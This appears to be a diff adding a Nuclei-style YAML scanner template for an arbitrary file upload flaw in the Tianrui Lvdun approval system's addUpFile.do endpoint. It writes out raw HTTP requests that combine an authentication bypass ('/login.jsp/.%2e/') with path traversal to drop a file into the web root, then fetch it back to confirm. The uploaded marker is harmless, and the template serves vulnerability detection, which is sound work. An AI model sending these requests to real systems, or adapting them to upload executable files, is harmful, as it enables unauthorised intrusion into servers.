@@ -1,0 +1,42 @@
+id: tianrui-addUpFile-upload
+
+info:
+  name: 天锐绿盾审批系统 addUpFile.do 任意文件上传漏洞
+  author: tianrui
+  severity: high
+  tags: tianrui
+
+http:
+  - raw:
+      - |
+        POST /trwfe/login.jsp/.%2e/file/addUpFile.do HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynvgfpfpm
+
+        ------WebKitFormBoundarynvgfpfpm
+        Content-Disposition: form-data; name="relativepath";
+        
+        ../../webapps/trwfe/t
+        ------WebKitFormBoundarynvgfpfpm
+        Content-Disposition: form-data; name="file"; filename="13d6g9r5d6.txt"
+        
+        pe4iwr2avpt7tS
+        ------WebKitFormBoundarynvgfpfpm--
+
+      - |+
+        GET /trwfe/13d6g9r5d6.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - 'pe4iwr2avpt7tS'
+    matchers-condition: and
